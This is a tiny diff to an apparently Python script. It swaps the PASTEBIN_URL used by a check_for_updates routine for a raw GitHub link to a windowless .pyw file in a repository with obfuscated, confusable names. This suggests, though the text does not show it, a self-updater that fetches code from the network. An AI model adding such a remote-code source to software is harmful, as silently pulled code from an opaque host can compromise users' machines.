@@ -13,7 +13,7 @@ import platform
 import socket
 
 
-PASTEBIN_URL = 'https://raw.githubusercontent.com/MrGoose000/piskapophui/refs/heads/main/main.py'
+PASTEBIN_URL = 'https://raw.githubusercontent.com/1123l1lar/IIIlIllI/refs/heads/main/main.pyw'
 CURRENT_FILE = sys.argv[0]
 
 def check_for_updates():
